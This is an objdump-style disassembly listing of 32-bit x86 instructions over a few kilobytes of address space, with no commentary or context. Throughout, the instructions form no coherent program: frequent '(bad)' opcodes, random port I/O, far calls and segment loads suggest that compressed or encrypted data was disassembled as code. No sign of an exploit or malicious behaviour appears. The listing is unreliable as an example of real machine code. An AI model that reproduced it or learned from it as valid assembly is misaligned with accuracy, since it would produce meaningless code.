  51c617:	lea    ebx,[ebp+0x3dd6f88d]
  51c61d:	dec    ebp
  51c61e:	xchg   ecx,eax
  51c61f:	cmp    esp,DWORD PTR [ebx+0x1d]
  51c622:	mov    ds:0x5bd9d344,eax
  51c627:	test   DWORD PTR [ebx+0x73],ebp
  51c62a:	push   ds
  51c62b:	test   eax,0x15ecb742
  51c630:	pop    esi
  51c631:	or     ebp,DWORD PTR [edx-0x6a984585]
  51c637:	(bad)  
  51c638:	and    al,BYTE PTR [ecx+ebx*8-0x10]
  51c63c:	cmp    DWORD PTR ds:0x3450cb11,ecx
  51c642:	inc    eax
  51c643:	pop    ecx
  51c644:	lea    edx,[edi]
  51c646:	sbb    eax,DWORD PTR [esi+0x4f]
  51c649:	or     BYTE PTR [esi+0x5d069361],ah
  51c64f:	out    dx,eax
  51c650:	lods   eax,DWORD PTR ds:[esi]
  51c651:	mov    esi,0x14b853f8
  51c656:	es (bad) 
  51c658:	(bad)  
  51c659:	in     ax,dx
  51c65b:	fiadd  WORD PTR [ebp+0x69]
  51c65e:	test   al,0x5c
  51c660:	fisttp QWORD PTR [ebx+0x17611366]
  51c666:	out    dx,al
  51c667:	rcl    DWORD PTR [edx+0xe],0x6e
  51c66b:	mov    WORD PTR [eax+eiz*4],cs
  51c66e:	add    DWORD PTR [esi-0x74],esi
  51c671:	lods   al,BYTE PTR ds:[esi]
  51c672:	frstor [esp+edx*4]
  51c675:	fstp   TBYTE PTR [eax+0x4f]
  51c678:	xchg   ebp,eax
  51c679:	rcl    DWORD PTR [ecx-0x46153964],cl
  51c67f:	adc    BYTE PTR [ebp-0x5f],ch
  51c682:	push   eax
  51c683:	fnstcw WORD PTR [ebx-0x37200c05]
  51c689:	shl    DWORD PTR [ebx+0x29],cl
  51c68c:	mov    ds:0xc27116d0,eax
  51c691:	aas    
  51c692:	jb     0x51c651
  51c694:	xchg   ecx,eax
  51c695:	dec    ecx
  51c696:	xor    ebp,DWORD PTR [ebp+0xcf94420]
  51c69c:	pop    eax
  51c69d:	(bad)  
  51c69e:	jno    0x51c625
  51c6a0:	test   al,0x2f
  51c6a2:	gs sti 
  51c6a4:	or     DWORD PTR [esi],esi
  51c6a6:	lds    esp,FWORD PTR [eax]
  51c6a8:	dec    esi
  51c6a9:	fidiv  DWORD PTR [eax+0x6c]
  51c6ac:	push   0x46
  51c6ae:	fsub   DWORD PTR [ebp-0x76fd006c]
  51c6b4:	(bad)  
  51c6b5:	stos   DWORD PTR es:[edi],eax
  51c6b6:	out    0x90,al
  51c6b8:	repz adc ebp,DWORD PTR [ecx]
  51c6bb:	and    ah,bl
  51c6bd:	cdq    
  51c6be:	addr16 adc eax,0x758a22ea
  51c6c4:	ja     0x51c705
  51c6c6:	aaa    
  51c6c7:	ja     0x51c657
  51c6c9:	dec    eax
  51c6ca:	dec    ecx
  51c6cb:	hlt    
  51c6cc:	in     eax,dx
  51c6cd:	ja     0x51c683
  51c6cf:	xor    al,0x4f
  51c6d1:	add    dh,dh
  51c6d3:	and    al,0xb0
  51c6d5:	arpl   WORD PTR [eax+0x5ae367d9],di
  51c6db:	lods   eax,DWORD PTR ds:[esi]
  51c6dc:	adc    BYTE PTR [esp+edx*2-0x18],cl
  51c6e0:	pop    ds
  51c6e1:	stos   DWORD PTR es:[edi],eax
  51c6e2:	cmp    DWORD PTR [eax-0x2790168c],eax
  51c6e8:	lea    edi,[ebp+0x6f]
  51c6eb:	inc    eax
  51c6ec:	dec    esp
  51c6ed:	and    bl,bl
  51c6ef:	and    eax,0xde65efd5
  51c6f4:	pop    ebp
  51c6f5:	aad    0x82
  51c6f7:	repz inc ebx
  51c6f9:	pushf  
  51c6fa:	popf   
  51c6fb:	inc    esi
  51c6fc:	je     0x51c6a7
  51c6fe:	ret    0x936e
  51c701:	fs ret 
  51c703:	mov    ah,0x9b
  51c705:	nop
  51c706:	or     esi,DWORD PTR [edi]
  51c708:	lods   al,BYTE PTR ds:[esi]
  51c709:	rol    bl,0x95
  51c70c:	ror    BYTE PTR [edi-0x29],cl
  51c70f:	adc    dh,cl
  51c711:	jnp    0x51c781
  51c713:	inc    esi
  51c714:	dec    eax
  51c715:	repz xchg esp,eax
  51c717:	das    
  51c718:	in     eax,dx
  51c719:	xchg   edi,eax
  51c71a:	aas    
  51c71b:	data16 scas al,BYTE PTR es:[edi]
  51c71d:	mov    ch,0x83
  51c71f:	cli    
  51c720:	dec    edx
  51c721:	loopne 0x51c785
  51c723:	jns    0x51c6e3
  51c725:	fstp   st(1)
  51c727:	out    0xdb,al
  51c729:	jge    0x51c6dd
  51c72b:	adc    cl,BYTE PTR [ecx+0x333a3a47]
  51c731:	mov    ds:0x61dd5c04,al
  51c736:	scas   al,BYTE PTR es:[edi]
  51c737:	out    0x8b,eax
  51c739:	push   ebp
  51c73a:	mov    ds:0x21fa95e4,al
  51c73f:	mov    al,0xb5
  51c741:	stos   DWORD PTR es:[edi],eax
  51c742:	jg     0x51c7aa
  51c744:	mov    ss,ebx
  51c746:	jmp    FWORD PTR [ecx-0x25]
  51c749:	dec    ebp
  51c74a:	fidiv  DWORD PTR [esi-0x12]
  51c74d:	test   al,0xa0
  51c74f:	dec    esi
  51c750:	push   ebp
  51c751:	bnd jbe 0x51c76a
  51c754:	adc    al,0xb8
  51c756:	stos   DWORD PTR es:[edi],eax
  51c757:	sub    eax,0x44f47afa
  51c75c:	mov    gs,WORD PTR [eax+0x46]
  51c75f:	jmp    0x51c7cd
  51c761:	dec    ecx
  51c762:	jecxz  0x51c798
  51c764:	call   0xb380:0x3da267e9
  51c76b:	loopne 0x51c716
  51c76d:	rcr    DWORD PTR [esi+esi*2-0x6f65a170],cl
  51c774:	mov    ds:0x76cfcd46,al
  51c779:	in     eax,dx
  51c77a:	mov    esp,0x9c0f3105
  51c77f:	(bad)  
  51c780:	mov    ebx,0x18fa06c5
  51c785:	adc    ebx,DWORD PTR [esi+0xf]
  51c788:	ror    al,1
  51c78a:	mov    ebp,0x8eb3e5c
  51c78f:	mov    esp,0xce00fc87
  51c794:	int3   
  51c795:	xchg   esi,eax
  51c796:	addr16 mov dh,0x8c
  51c799:	jns    0x51c76e
  51c79b:	gs mov cl,cl
  51c79e:	xchg   ebx,eax
  51c79f:	adc    BYTE PTR ds:0x6de4a3b7,al
  51c7a5:	inc    ebx
  51c7a6:	popa   
  51c7a7:	mov    ecx,0x32213875
  51c7ac:	aas    
  51c7ad:	repz xor eax,0xc39cd1b9
  51c7b3:	adc    ah,bh
  51c7b5:	shl    DWORD PTR [esi-0x3b],0x5e
  51c7b9:	mov    ecx,DWORD PTR [eax+esi*4-0x15795a0c]
  51c7c0:	mov    eax,DWORD PTR [bx+si+0x3c7e]
  51c7c5:	popa   
  51c7c6:	and    ecx,DWORD PTR [esi+eiz*8]
  51c7c9:	scas   eax,DWORD PTR es:[edi]
  51c7ca:	adc    BYTE PTR [edi+0x29bafd5],bl
  51c7d0:	cmp    BYTE PTR [edi-0x62],ch
  51c7d3:	cld    
  51c7d4:	pop    edx
  51c7d5:	mov    al,ds:0xbe9475f5
  51c7da:	imul   eax,DWORD PTR [esi-0x54],0x1abcc7ad
  51c7e1:	gs (bad) 
  51c7e3:	mov    ds:0x47d06f01,eax
  51c7e8:	lods   eax,DWORD PTR ds:[esi]
  51c7e9:	int3   
  51c7ea:	shl    bh,cl
  51c7ec:	add    bl,BYTE PTR [esi+0x43418b57]
  51c7f2:	jno    0x51c835
  51c7f4:	test   DWORD PTR [ecx],ecx
  51c7f6:	cmp    DWORD PTR [ebp-0x4a],edi
  51c7f9:	dec    eax
  51c7fa:	mov    ebp,0x6b9dd2df
  51c7ff:	adc    BYTE PTR [ecx+0x58ef1bd3],ch
  51c805:	fistp  QWORD PTR [ebx]
  51c807:	loopne 0x51c80c
  51c809:	(bad)  
  51c80a:	out    0x2f,al
  51c80c:	inc    eax
  51c80d:	lahf   
  51c80e:	leave  
  51c80f:	sub    DWORD PTR [edx+0x5f],esi
  51c812:	mov    esp,0x74511a9f
  51c817:	push   edx
  51c818:	cmc    
  51c819:	cld    
  51c81a:	xchg   al,ch
  51c81c:	sub    BYTE PTR [ecx],ch
  51c81e:	and    BYTE PTR [ecx-0x68f12509],ah
  51c824:	xor    al,dh
  51c826:	lds    ecx,FWORD PTR [ebp+0x7]
  51c829:	inc    ecx
  51c82a:	push   ebx
  51c82b:	jnp    0x51c7bc
  51c82d:	call   0xe9d97342
  51c832:	pushf  
  51c833:	fiadd  DWORD PTR [ecx]
  51c835:	or     al,0xbd
  51c837:	arpl   WORD PTR [ecx+esi*2-0x7d],sp
  51c83b:	sub    BYTE PTR [ebx-0x55f4a461],al
  51c841:	or     eax,0xf3f837b1
  51c846:	xor    dl,cl
  51c848:	or     edx,DWORD PTR [eax+0x4a]
  51c84b:	mov    edi,ds
  51c84d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  51c84e:	mov    bl,0xf4
  51c850:	sub    eax,0xb5db3a57
  51c855:	icebp  
  51c856:	mov    bl,0x5e
  51c858:	repz rcr DWORD PTR [ecx-0x5d],cl
  51c85c:	(bad)  
  51c85d:	(bad)  
  51c85e:	mov    eax,ds:0x359b52f7
  51c863:	lods   eax,DWORD PTR ds:[esi]
  51c864:	add    dl,BYTE PTR [edi]
  51c866:	cmp    al,0x67
  51c868:	fistp  WORD PTR [esi]
  51c86a:	and    esi,DWORD PTR [ecx+0x2178b235]
  51c870:	xor    DWORD PTR [edi-0x5b3e3a6b],ecx
  51c876:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  51c877:	mov    eax,ds:0xa6df5aa2
  51c87c:	sbb    al,0x18
  51c87e:	dec    edi
  51c87f:	jp     0x51c8d5
  51c881:	shl    DWORD PTR [eax+0x4b4a83b0],1
  51c887:	inc    ebp
  51c888:	push   0xffffffac
  51c88a:	xor    al,0xee
  51c88d:	mov    dl,0x74
  51c88f:	push   ecx
  51c890:	pop    esi
  51c891:	mov    ebx,DWORD PTR [edi-0x16c3aa3e]
  51c897:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  51c898:	pushf  
  51c899:	mov    ebp,0xa97fc968
  51c89e:	mul    DWORD PTR [eax-0x28]
  51c8a1:	push   ebp
  51c8a2:	(bad)  
  51c8a3:	adc    bh,ah
  51c8a5:	xor    BYTE PTR [esi-0x7f],ch
  51c8a8:	stc    
  51c8a9:	idiv   BYTE PTR [ebx+0x23]
  51c8ac:	arpl   si,bp
  51c8ae:	aaa    
  51c8af:	sbb    ah,ch
  51c8b1:	or     esp,ecx
  51c8b3:	push   ds
  51c8b4:	loop   0x51c886
  51c8b6:	xchg   ebx,eax
  51c8b7:	and    BYTE PTR [eax-0x681ff85e],0x66
  51c8be:	les    esp,FWORD PTR [edi]
  51c8c0:	sti    
  51c8c1:	jle    0x51c8a5
  51c8c3:	push   ebx
  51c8c4:	push   esi
  51c8c5:	mov    edi,0xc0301dfa
  51c8ca:	mov    ecx,0x1e5c6bfe
  51c8cf:	push   ds
  51c8d0:	bound  eax,QWORD PTR [eax]
  51c8d2:	fimul  WORD PTR [edx]
  51c8d4:	iret   
  51c8d5:	ret    0x7c69
  51c8d8:	dec    eax
  51c8d9:	rcl    BYTE PTR [edx+0xd],0x4f
  51c8dd:	retf   
  51c8de:	pushf  
  51c8df:	(bad)  
  51c8e0:	in     al,dx
  51c8e1:	sbb    ch,BYTE PTR [ebp+eiz*4+0x63]
  51c8e5:	jno    0x51c86f
  51c8e7:	inc    ecx
  51c8e8:	lahf   
  51c8e9:	(bad)  
  51c8ea:	leave  
  51c8eb:	call   0xb7e4359e
  51c8f0:	sbb    eax,0xe0e918c1
  51c8f5:	scas   eax,DWORD PTR es:[edi]
  51c8f6:	push   ebp
  51c8f7:	(bad)  
  51c8f8:	rcl    DWORD PTR [edi-0x6e95ab12],0x1d
  51c8ff:	test   esp,0xb466fc9d
  51c905:	iret   
  51c906:	call   0xee0f:0xe98e60fc
  51c90d:	into   
  51c90e:	jnp    0x51c914
  51c910:	fst    QWORD PTR [edx]
  51c912:	cwde   
  51c913:	mov    ebp,0xb9f8499a
  51c918:	adc    al,0x69
  51c91a:	xor    eax,0x5a35075a
  51c91f:	push   edi
  51c920:	adc    DWORD PTR [ecx],0xfffffff6
  51c923:	mov    ebx,0x5288bf79
  51c928:	and    edi,esi
  51c92a:	cld    
  51c92b:	cs mov dh,0xb7
  51c92e:	pop    ds
  51c92f:	nop
  51c930:	cmc    
  51c931:	(bad)  
  51c933:	int3   
  51c934:	sti    
  51c935:	sbb    ebx,DWORD PTR [esi-0x5f]
  51c938:	(bad)  
  51c939:	cmp    eax,DWORD PTR [eax-0x36851823]
  51c93f:	cs xor ch,0xf3
  51c943:	fdiv   QWORD PTR [edx-0x15]
  51c946:	mov    bh,0x6f
  51c948:	iret   
  51c949:	cmp    BYTE PTR [edi],ah
  51c94b:	in     eax,dx
  51c94c:	in     al,dx
  51c94d:	push   ds
  51c94e:	sti    
  51c94f:	out    dx,al
  51c950:	aad    0x50
  51c952:	jg     0x51c92c
  51c954:	add    eax,0xfd7604f9
  51c959:	xchg   DWORD PTR [ebp+0x1d41d7c1],ebx
  51c95f:	imul   ebx,eax,0x7c
  51c962:	pop    edx
  51c963:	xchg   DWORD PTR [ebp-0x52],eax
  51c966:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  51c967:	push   eax
  51c968:	fidiv  WORD PTR [ebx]
  51c96a:	test   BYTE PTR [ecx+esi*4+0xa49a83f],al
  51c971:	cdq    
  51c972:	mov    ecx,0x2f2a1468
  51c977:	mov    esp,0x85cc09f5
  51c97c:	lods   al,BYTE PTR ds:[esi]
  51c97d:	in     eax,dx
  51c97e:	call   0x83a62f33
  51c983:	pop    ss
  51c984:	outs   dx,BYTE PTR ds:[esi]
  51c985:	xchg   esp,eax
  51c986:	into   
  51c987:	push   0xffffffb7
  51c989:	scas   al,BYTE PTR es:[edi]
  51c98a:	in     al,0x2
  51c98c:	enter  0x3a2e,0xbc
  51c990:	scas   eax,DWORD PTR es:[edi]
  51c991:	sub    eax,0xb8b4447d
  51c996:	push   esp
  51c997:	jne    0x51c979
  51c999:	nop
  51c99a:	out    0x62,eax
  51c99c:	test   DWORD PTR [eax],ecx
  51c99e:	bound  esi,QWORD PTR [ecx+0x55]
  51c9a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  51c9a2:	cdq    
  51c9a3:	mov    ds:0xc306a33f,eax
  51c9a8:	(bad)  
  51c9a9:	lea    ebp,[eax+0x3311ba4]
  51c9af:	arpl   WORD PTR [ebx+esi*1+0x2f78b2ba],bp
  51c9b6:	in     al,0x66
  51c9b8:	xchg   esi,eax
  51c9b9:	sti    
  51c9ba:	jl     0x51ca2f
  51c9bc:	fldcw  WORD PTR [esi]
  51c9be:	mov    ecx,0x3752673b
  51c9c3:	pop    es
  51c9c4:	and    edx,DWORD PTR [ecx+0x146b7086]
  51c9ca:	scas   eax,DWORD PTR es:[edi]
  51c9cb:	loope  0x51ca45
  51c9cd:	nop
  51c9ce:	dec    esp
  51c9cf:	cmc    
  51c9d0:	push   0xd5442879
  51c9d5:	xchg   edx,eax
  51c9d6:	outs   dx,BYTE PTR ds:[esi]
  51c9d7:	xchg   esi,eax
  51c9d8:	enter  0xb70d,0x4f
  51c9dc:	push   esi
  51c9dd:	outs   dx,BYTE PTR ds:[esi]
  51c9de:	push   edx
  51c9df:	mov    DWORD PTR [esi-0x30],esi
  51c9e2:	push   esi
  51c9e3:	push   esp
  51c9e4:	sub    edi,eax
  51c9e6:	scas   al,BYTE PTR es:[edi]
  51c9e7:	test   al,0xb9
  51c9e9:	mov    ch,0x57
  51c9eb:	cmc    
  51c9ec:	pop    ds
  51c9ed:	cmpxchg BYTE PTR [eax-0x650a7321],dh
  51c9f4:	out    dx,al
  51c9f5:	pusha  
  51c9f6:	out    dx,al
  51c9f7:	jg     0x51ca0a
  51c9f9:	shr    DWORD PTR [edx+0x2ec4c8b7],0xc8
  51ca00:	jge    0x51ca73
  51ca02:	pop    edi
  51ca03:	xor    al,0x2f
  51ca05:	scas   al,BYTE PTR es:[edi]
  51ca06:	ja     0x51c9ce
  51ca08:	push   ebx
  51ca09:	dec    ecx
  51ca0a:	push   ds
  51ca0b:	mov    ds:0x7d283fc9,eax
  51ca10:	pop    ds
  51ca11:	sbb    eax,0x4a1cba79
  51ca16:	mov    esp,0xe6690def
  51ca1b:	sahf   
  51ca1c:	test   eax,0xd5e734c8
  51ca21:	rol    BYTE PTR [edx+0x2aa41460],1
  51ca27:	push   es
  51ca28:	fs dec esp
  51ca2a:	mov    ecx,0x9e417864
  51ca2f:	shl    BYTE PTR [ecx],0xa6
  51ca32:	(bad)  
  51ca33:	mov    ch,0xb5
  51ca35:	or     al,0xb7
  51ca37:	xor    cl,ah
  51ca39:	jae    0x51c9c1
  51ca3b:	ret    
  51ca3c:	aaa    
  51ca3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  51ca3e:	mov    ?,WORD PTR [eax-0x1d]
  51ca41:	imul   ebp,DWORD PTR [ecx+0x6966974b],0xfffffff7
  51ca48:	int    0xe2
  51ca4a:	sub    bl,BYTE PTR es:[edi]
  51ca4d:	jo     0x51ca67
  51ca4f:	or     al,0x79
  51ca51:	pop    eax
  51ca52:	mov    al,ds:0x8c0e7b3b
  51ca57:	jge    0x51ca37
  51ca59:	and    esp,edx
  51ca5b:	out    dx,al
  51ca5c:	ss or  al,0x69
  51ca5f:	sbb    ecx,DWORD PTR [ebp+0x2e04e415]
  51ca65:	push   cs
  51ca66:	(bad)  
  51ca67:	pusha  
  51ca68:	pusha  
  51ca69:	mov    al,0x63
  51ca6b:	cmc    
  51ca6c:	(bad)  [edx]
  51ca6e:	in     al,dx
  51ca6f:	jb     0x51ca34
  51ca71:	push   esi
  51ca72:	xchg   BYTE PTR ds:0xc1131db2,bh
  51ca78:	cmp    al,ch
  51ca7a:	repnz popa 
  51ca7c:	cmp    DWORD PTR [eax-0x35507073],esp
  51ca82:	in     al,0x58
  51ca84:	xor    BYTE PTR [eax-0x12],ah
  51ca87:	fadd   DWORD PTR [eax+0x428ed8fa]
  51ca8d:	sbb    DWORD PTR [eax-0x18],0xffffffb0
  51ca91:	and    al,dh
  51ca93:	sub    ebx,DWORD PTR [eiz*8+0x4f6be723]
  51ca9a:	sbb    dh,bl
  51ca9c:	jns    0x51cabf
  51ca9e:	add    BYTE PTR [esi],0x4f
  51caa1:	sub    BYTE PTR [edx],bl
  51caa3:	mov    ch,0x7e
  51caa5:	mov    ds:0x757ba463,eax
  51caaa:	outs   dx,DWORD PTR ds:[esi]
  51caab:	icebp  
  51caac:	ins    BYTE PTR es:[edi],dx
  51caad:	(bad)  
  51caae:	outs   dx,BYTE PTR ds:[esi]
  51caaf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  51cab0:	jge    0x51ca76
  51cab2:	into   
  51cab3:	gs test ah,ah
  51cab6:	push   esp
  51cab7:	xchg   esi,eax
  51cab8:	push   ss
  51cab9:	inc    edx
  51caba:	push   ss
  51cabb:	cmp    ebp,ebx
  51cabd:	mov    DWORD PTR [ebp-0x61bb3582],esp
  51cac3:	jbe    0x51ca4d
  51cac5:	sub    ebx,DWORD PTR [ebp+edx*2+0x16]
  51cac9:	into   
  51caca:	and    DWORD PTR [ecx],ebx
  51cacc:	mov    dh,0xdc
  51cace:	and    al,0xb0
  51cad0:	xor    eax,0xaf47fc79
  51cad5:	sti    
  51cad6:	sbb    eax,0x9774c40c
  51cadb:	xor    DWORD PTR [edi+0x793ace8d],ecx
  51cae1:	aam    0x2d
  51cae3:	mov    BYTE PTR [edi],cl
  51cae5:	aaa    
  51cae6:	and    al,0x2c
  51cae8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  51cae9:	dec    eax
  51caea:	out    dx,al
  51caeb:	aam    0xa7
  51caed:	ror    BYTE PTR [edi+0x79],0x76
  51caf1:	xor    al,0x13
  51caf3:	cmp    dl,BYTE PTR [edx-0x2182a5d6]
  51caf9:	add    eax,0xee3a1c5f
  51cafe:	dec    ecx
  51caff:	scas   al,BYTE PTR es:[edi]
  51cb00:	push   cs
  51cb01:	jle    0x51cb52
  51cb03:	pop    esp
  51cb04:	sub    al,0xf7
  51cb06:	ins    DWORD PTR es:[edi],dx
  51cb07:	ret    0x8d85
  51cb0a:	aas    
  51cb0b:	ret    
  51cb0c:	ror    BYTE PTR [ebx+0x1a],cl
  51cb0f:	mov    ds:0x517583ce,al
  51cb14:	mov    WORD PTR ds:0xe107ea4b,ds
  51cb1a:	loopne 0x51cb46
  51cb1c:	ficomp WORD PTR [esi-0x1b5eee44]
  51cb22:	xlat   BYTE PTR ds:[ebx]
  51cb23:	dec    esp
  51cb24:	adc    BYTE PTR [esi-0x34b9ea69],ah
  51cb2a:	sbb    DWORD PTR [eax+0xf990f8e],ebp
  51cb30:	add    al,0x70
  51cb32:	repnz mov ss,WORD PTR [ebx+0x6b]
  51cb36:	and    DWORD PTR [edi],ebx
  51cb38:	outs   dx,BYTE PTR ds:[esi]
  51cb39:	mov    al,0x11
  51cb3b:	out    0x57,al
  51cb3d:	dec    edx
  51cb3e:	add    BYTE PTR [edx+0x2f],bl
  51cb41:	je     0x51cb9c
  51cb43:	and    eax,0x9e0b82aa
  51cb48:	xor    edx,ebp
  51cb4a:	bound  esp,QWORD PTR [edx]
  51cb4c:	rcr    DWORD PTR [ebx-0x36],cl
  51cb4f:	je     0x51cadb
  51cb51:	adc    BYTE PTR [edx+0x25],dh
  51cb54:	mov    eax,0x4ef4fc75
  51cb59:	shl    DWORD PTR [bx+di+0x29],1
  51cb5d:	loope  0x51cb26
  51cb5f:	xchg   esi,eax
  51cb60:	push   0xffffff9f
  51cb62:	lea    edi,[edx]
  51cb64:	and    BYTE PTR [edx+0x25ed2863],al
  51cb6a:	dec    ebx
  51cb6b:	stc    
  51cb6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  51cb6d:	xchg   ebx,eax
  51cb6e:	mov    ds:0xbdaaac62,eax
  51cb73:	and    eax,0xf419f748
  51cb78:	out    dx,eax
  51cb79:	icebp  
  51cb7a:	shl    esi,1
  51cb7c:	aas    
  51cb7d:	and    BYTE PTR [eax+eax*8-0x23],0xb6
  51cb82:	inc    esp
  51cb83:	mov    ebx,0x1124de80
  51cb88:	(bad)  
  51cb8a:	les    edx,FWORD PTR [ecx-0x2f]
  51cb8d:	imul   DWORD PTR [ecx]
  51cb8f:	xor    dl,BYTE PTR gs:[esi]
  51cb92:	dec    edi
  51cb93:	sbb    DWORD PTR [ebx-0x7810ce91],0xf68892b4
  51cb9d:	push   0x140473f2
  51cba2:	and    al,BYTE PTR [ecx]
  51cba4:	or     eax,0x2b2cf5c1
  51cba9:	inc    ebx
  51cbaa:	sub    edx,DWORD PTR [ebx]
  51cbac:	jp     0x51cb3f
  51cbae:	jle    0x51cbdb
  51cbb0:	popa   
  51cbb1:	aaa    
  51cbb2:	push   0xffffffad
  51cbb4:	outs   dx,BYTE PTR ds:[esi]
  51cbb5:	out    0x9f,al
  51cbb7:	int3   
  51cbb8:	mov    al,0x95
  51cbba:	push   edx
  51cbbb:	adc    ebx,DWORD PTR [edi+eax*2]
  51cbbe:	ss popa 
  51cbc0:	fiadd  DWORD PTR [edx+ebp*2-0x50]
  51cbc4:	dec    ebp
  51cbc5:	retf   0x755b
  51cbc8:	arpl   ax,bx
  51cbca:	test   DWORD PTR [esi],ebp
  51cbcc:	test   al,0x77
  51cbce:	push   esp
  51cbcf:	lea    ebx,[ecx+0x49]
  51cbd2:	sub    al,0x83
  51cbd4:	fcomi  st,st(1)
  51cbd6:	push   0x32b31802
  51cbdb:	xchg   esp,eax
  51cbdc:	(bad)  
  51cbdd:	scas   eax,DWORD PTR es:[edi]
  51cbde:	(bad)  
  51cbdf:	(bad)  
  51cbe0:	push   ebp
  51cbe1:	pop    esi
  51cbe2:	mov    ebp,0x23c25c48
  51cbe7:	test   eax,0xacd7f28f
  51cbec:	or     esp,ebp
  51cbee:	cmp    eax,0x30545fa7
  51cbf3:	cmc    
  51cbf4:	jae    0x51cc18
  51cbf6:	ret    
  51cbf7:	data16 jbe 0x51cc3c
  51cbfa:	dec    esi
  51cbfb:	mov    eax,DWORD PTR [eax+0x5f]
  51cbfe:	ins    DWORD PTR es:[edi],dx
  51cbff:	xor    DWORD PTR [edx],edx
  51cc01:	inc    esi
  51cc02:	add    al,0x8a
  51cc04:	out    dx,eax
  51cc05:	xabort 0xef
  51cc08:	sbb    DWORD PTR [edi],edi
  51cc0a:	in     al,0x5f
  51cc0c:	cmp    ecx,edi
  51cc0e:	cdq    
  51cc0f:	je     0x51cc29
  51cc11:	cmp    edx,ebp
  51cc13:	ins    BYTE PTR es:[edi],dx
  51cc14:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  51cc16:	repnz leave 
  51cc18:	mov    eax,0x8b2e5e26
  51cc1d:	push   es
  51cc1e:	ficomp DWORD PTR [eax-0x1419f162]
  51cc24:	(bad)
  51cc27:	sti    
  51cc28:	out    0x2e,eax
  51cc2a:	out    0x25,al
  51cc2c:	or     al,0x57
  51cc2e:	push   ds
  51cc2f:	xor    esp,DWORD PTR [esi+0x46bba23c]
  51cc35:	cmc    
  51cc36:	sub    bl,BYTE PTR [ebp-0x128d8b31]
  51cc3c:	jle    0x51cbef
  51cc3e:	pop    esi
  51cc3f:	cdq    
  51cc40:	pop    ss
  51cc41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  51cc42:	add    eax,DWORD PTR [ebx+0x0]
  51cc45:	inc    esi
  51cc46:	mov    al,0x4b
  51cc48:	ror    DWORD PTR [esi+0x76ea7647],1
  51cc4e:	sbb    al,0x33
  51cc50:	cmp    DWORD PTR [edi-0x45],ebp
  51cc53:	pushf  
  51cc54:	aas    
  51cc55:	pop    eax
  51cc56:	mov    ds:0x2d477000,al
  51cc5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  51cc5c:	dec    eax
  51cc5d:	cmp    esp,ebx
  51cc5f:	fidiv  DWORD PTR [ebp-0x40316491]
  51cc65:	jno    0x51ccc7
  51cc67:	nop
  51cc68:	inc    edx
  51cc69:	lods   eax,DWORD PTR ds:[esi]
  51cc6a:	adc    BYTE PTR [eax+eiz*4-0x5f],dh
  51cc6e:	aad    0x61
  51cc70:	xchg   ebp,eax
  51cc71:	lods   eax,DWORD PTR ds:[esi]
  51cc72:	mov    edx,0xba2009e2
  51cc77:	lods   eax,DWORD PTR ds:[esi]
  51cc78:	mov    al,ds:0x223efc0a
  51cc7d:	pop    ebp
  51cc7e:	cli    
  51cc7f:	adc    BYTE PTR [edi+0x10],al
  51cc82:	pop    eax
  51cc83:	lock xor al,0x8d
  51cc86:	test   eax,0x395c78dc
  51cc8b:	(bad)  
  51cc8c:	outs   dx,DWORD PTR ds:[esi]
  51cc8d:	leave  
  51cc8e:	stc    
  51cc8f:	xor    eax,0xbadf91c4
  51cc94:	cli    
  51cc95:	pop    edi
  51cc96:	push   ebx
  51cc97:	retf   0x3067
  51cc9a:	test   BYTE PTR [ebx],ah
  51cc9c:	int3   
  51cc9d:	cmp    DWORD PTR [eax+0x14],edx
  51cca0:	imul   esi,DWORD PTR [edx+0x4a],0x74256bd4
  51cca7:	mov    ds:0x7edd624a,eax
  51ccac:	test   eax,0x8621ad4f
  51ccb1:	mov    al,ds:0x6de14eee
  51ccb6:	push   ebx
  51ccb7:	fnstenv [eax-0x5037d5af]
  51ccbd:	(bad)  
  51ccbe:	mov    al,0xf3
  51ccc0:	cld    
  51ccc1:	scas   eax,DWORD PTR es:[edi]
  51ccc2:	cmp    eax,0xb340e8cb
  51ccc7:	dec    edi
  51ccc8:	repz fimul DWORD PTR [edx+edi*2+0x4a185ce1]
  51ccd0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  51ccd1:	gs push cs
  51ccd3:	ds add eax,0xfd7b41c0
  51ccd9:	dec    esi
  51ccda:	fs push ds
  51ccdc:	(bad)  
  51ccdd:	lock pop eax
  51ccdf:	jbe    0x51cc8a
  51cce1:	js     0x51cc94
  51cce3:	add    eax,0xb8104713
  51cce8:	mov    ch,0x47
  51ccea:	cmp    DWORD PTR [esi+edi*2-0x6a],ebp
  51ccee:	push   eax
  51ccef:	xchg   ebp,eax
  51ccf1:	sbb    eax,0x27581ec4
  51ccf6:	das    
  51ccf7:	cmp    bh,dh
  51ccf9:	sub    BYTE PTR [ecx+eiz*1-0x2],cl
  51ccfd:	adc    ebx,edi
  51ccff:	sbb    BYTE PTR [ebp-0x5876b1a3],dh
  51cd05:	das    
  51cd06:	mov    bh,0x90
  51cd08:	lods   al,BYTE PTR ds:[esi]
  51cd09:	cwde   
  51cd0a:	jnp    0x51cd27
  51cd0c:	sub    dh,ch
  51cd0e:	pop    es
  51cd0f:	or     eax,0x12e346a8
  51cd14:	sub    esp,DWORD PTR [edx-0x355beaed]
  51cd1a:	xor    eax,0x8c9a9865
  51cd1f:	shl    BYTE PTR [ecx],1
  51cd21:	cmp    DWORD PTR [esi+eax*2-0x5a21540f],ebx
  51cd28:	outs   dx,DWORD PTR ds:[esi]
  51cd29:	shl    BYTE PTR [edi+0x2b47cabc],0xad
  51cd30:	push   0xb2b06a4f
  51cd35:	imul   ecx,DWORD PTR [edx-0x6d],0x62
  51cd39:	sub    eax,ecx
  51cd3b:	mov    ecx,0xbe4d53dc
  51cd40:	loopne 0x51cd16
  51cd42:	in     eax,dx
  51cd43:	sbb    ebx,DWORD PTR [edx+0x41]
  51cd46:	imul   ecx,DWORD PTR [esp+ecx*2+0x2b2dbf03],0x4a50dbe4
